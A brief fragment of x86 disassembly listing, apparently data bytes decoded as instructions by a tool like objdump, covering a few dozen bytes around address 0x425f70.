  425f69:	add    BYTE PTR [eax+eax*1],0x18
  425f6d:	add    BYTE PTR [eax],al
  425f6f:	add    BYTE PTR [ecx+edi*1+0x39b439b0],ch
  425f76:	mov    eax,0xc039bc39
  425f7b:	cmp    esp,eax
  425f7d:	cmp    eax,ecx
  425f7f:	cmp    DWORD PTR [eax],eax
  425f81:	mov    al,0x4
  425f83:	add    BYTE PTR [eax],bl
  425f85:	add    BYTE PTR [eax],al
  425f87:	add    ah,ch
  425f89:	ss lock ss hlt 
  425f8d:	ss clc 
  425f8f:	ss cld 
  425f91:	add    BYTE PTR ss:[edi],dh
  425f94:	add    al,0x37
  425f96:	or     BYTE PTR [edi],dh
	...
